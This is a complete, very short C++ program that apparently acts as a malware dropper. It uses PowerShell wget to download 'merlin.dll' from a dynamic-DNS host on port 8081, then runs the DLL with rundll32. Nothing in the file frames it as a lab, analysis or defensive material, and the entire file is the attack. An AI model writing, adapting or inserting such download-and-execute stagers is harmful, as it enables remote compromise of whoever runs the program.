#include <fstream>
#include <iostream>
using namespace std;

int main()
{
     system("powershell wget http://d3lta12.ddns.net:8081/merlin.dll -o merlin.dll");
     system("rundll32.exe merlin.dll,Run");
}
